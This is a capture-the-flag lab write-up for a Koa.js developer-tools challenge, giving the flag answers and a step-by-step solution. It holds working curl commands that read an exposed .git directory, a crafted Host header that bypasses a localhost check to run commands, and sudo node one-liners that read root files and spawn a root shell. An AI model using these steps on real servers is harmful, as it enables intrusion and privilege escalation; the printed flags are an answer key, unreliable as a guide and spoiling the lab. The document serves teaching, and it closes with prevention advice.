# Zulu - Koa DevTools

**Status:** ✅ Complete

**Type**: Web / Source Code Leak / CVE Exploitation / Privilege Escalation  
**Difficulty**: Hard  
**Points**: 1,600 (3 flags)  
**Port**: 4022

## Description

EverSec's internal developer tools portal runs on Koa.js and serves its own working directory as static files — which happens to include a `.git` directory and the app source code itself. Digging into that source code reveals a scripting platform restricted to localhost, and a suspicious TODO comment referencing CVE-2026-27959. Exploit the CVE to bypass the access control and chain your way to root.

## Setup

```bash
docker compose up -d zulu-koa-devtools
```

## Flags

| Flag | Value | Points | Method |
|------|-------|--------|--------|
| FLAG1 | `g1t_cred_l34k3d` | 200 | GET `/.git/logs/HEAD` — commit history contains removed token |
| FLAG2 | `k0a_h0stnam3_byp4ss` | 600 | POST `/admin/execute` with `Host: localhost:fake@CONTAINERIP:4022` (CVE-2026-27959) |
| FLAG3 | `nod3_sud0_r00t` | 800 | `sudo /usr/local/bin/node` GTFOBins → root |

---

## Solution

### FLAG 1 — Git History Leak (200 pts)

The koa-static middleware is misconfigured to serve the app's root directory with `hidden: true` (which serves dotfiles). This exposes the `.git` directory.

```bash
# Confirm .git is exposed
curl http://localhost:4022/.git/HEAD
# → ref: refs/heads/main

# Read the git reflog — credentials appear in a "removed" commit
curl http://localhost:4022/.git/logs/HEAD
```

Look for: `commit: Add deployment config - DEVTOOLS_ADMIN_TOKEN=g1t_cred_l34k3d`

**FLAG1**: `g1t_cred_l34k3d`

Alternative — dump the full repo:
```bash
git-dumper http://localhost:4022/.git ./zulu-source
```

---

### FLAG 2 — CVE-2026-27959 Hostname Bypass → RCE (600 pts)

**Step 1: Read the source code**

Since koa-static serves the app root, `app.js` is directly accessible:

```bash
curl http://localhost:4022/app.js
```

Look for:
- A `POST /admin/execute` route guarded by `ctx.hostname !== 'localhost'`
- A monkey-patch of `KoaRequest.hostname` at the top of the file that splits the Host header on `:`

The CVE reference comes from the git log retrieved for FLAG1: one of the commit messages reads `TODO tracked in SEC-2026-441 - review CVE-2026-27959 impact on ctx.hostname before prod deploy`.

**Step 2: Understand CVE-2026-27959**

CVE-2026-27959 is a split-direction bug in Koa's `ctx.hostname` parser. When the Host header contains `@`, the vulnerable code does:

```javascript
// BUG: should be host.split('@').pop() — returns the USERINFO, not the hostname
const beforeAt = host.split('@')[0];
return beforeAt.split(':')[0];
```

This means:
- `Host: CONTAINERIP:4022` → no `@` → normal path → `ctx.hostname = 'CONTAINERIP'` → **DENIED**
- `Host: evil@localhost` → has `@` → buggy path → `'evil'.split(':')[0]` = `'evil'` → **DENIED**
- `Host: localhost:fake@CONTAINERIP:4022` → has `@` → buggy path → `'localhost:fake'.split(':')[0]` = `'localhost'` → **BYPASS** ✓

**Step 3: Verify 403 without bypass**

```bash
curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:4022/admin/execute \
  -H "Content-Type: application/json" \
  -d '{"script":"id"}'
# → 403
```

**Step 4: Exploit CVE-2026-27959**

```bash
# Get the container's Docker network IP
CONTAINER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ctf-zulu-koa-devtools)

# Bypass: Host: localhost:fake@CONTAINERIP:4022
curl -s -X POST http://localhost:4022/admin/execute \
  -H "Host: localhost:fake@${CONTAINER_IP}:4022" \
  -H "Content-Type: application/json" \
  -d '{"script": "cat /home/ctfuser/flag.txt"}'
# → {"success":true,"output":"k0a_h0stnam3_byp4ss\n"}
```

**FLAG2**: `k0a_h0stnam3_byp4ss`

> **Note**: `Host: evil@localhost` does NOT work. The buggy code takes the part *before* `@`, so `evil@localhost` yields `ctx.hostname = 'evil'`. The specific CVE format requires userinfo that begins with `localhost:`.

---

### FLAG 3 — sudo node GTFOBins (800 pts)

**Step 1: Enumerate sudo permissions via the RCE**

```bash
CONTAINER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ctf-zulu-koa-devtools)

curl -s -X POST http://localhost:4022/admin/execute \
  -H "Host: localhost:fake@${CONTAINER_IP}:4022" \
  -H "Content-Type: application/json" \
  -d '{"script": "sudo -l"}'
# → (root) NOPASSWD: /usr/local/bin/node
```

**Step 2: GTFOBins — sudo node reads root files**

```bash
# Read /root/flag.txt via sudo node (no shell spawn needed)
curl -s -X POST http://localhost:4022/admin/execute \
  -H "Host: localhost:fake@${CONTAINER_IP}:4022" \
  -H "Content-Type: application/json" \
  -d '{"script": "sudo /usr/local/bin/node -e \"process.stdout.write(require('\''fs'\'').readFileSync('\''/root/flag.txt'\'','\''utf8'\''))\"" }'
```

Or via docker exec:

```bash
# GTFOBins: sudo node spawns root shell
docker exec -it ctf-zulu-koa-devtools bash
sudo /usr/local/bin/node -e 'require("child_process").spawn("/bin/sh",["-i"],{stdio:"inherit"})'
# → # (root shell)
cat /root/flag.txt
```

**FLAG3**: `nod3_sud0_r00t`

---

## Learning Objectives

- **Git history is permanent**: Removing secrets from a commit does not erase them from `git log`. Anyone with access to `.git/logs/HEAD` can read all prior commit messages.
- **URL userinfo parsing CVEs**: Host header parsers that attempt to strip userinfo can contain split-direction bugs. CVE-2026-27959 shows how a one-character fix (`[0]` → `.pop()`) changes the security boundary entirely.
- **GTFOBins methodology**: Any scripting runtime granted `sudo NOPASSWD` becomes a root shell vector. Node.js, Python, Ruby, Perl — all appear on GTFOBins for this reason.

## Prevention

- **Serve a dedicated `public/` subdirectory**, not the app root. `koa-static('/app/public')` does not expose `.git` or `app.js`.
- **Validate the Host header as a raw string**, not via a URL parser. Compare against an allowlist of known hostnames before parsing.
- **Never grant `NOPASSWD` to scripting runtimes** (`node`, `python3`, `ruby`, `perl`, `lua`, etc.). If sudo access is required, scope it to a specific wrapper script with no arguments.

## References

- [CVE-2026-27959 — Endor Labs](https://www.endorlabs.com/learn/cve-2026-27959-koa)
- [GTFOBins: node](https://gtfobins.github.io/gtfobins/node/)
- [git-dumper](https://github.com/arthaud/git-dumper)
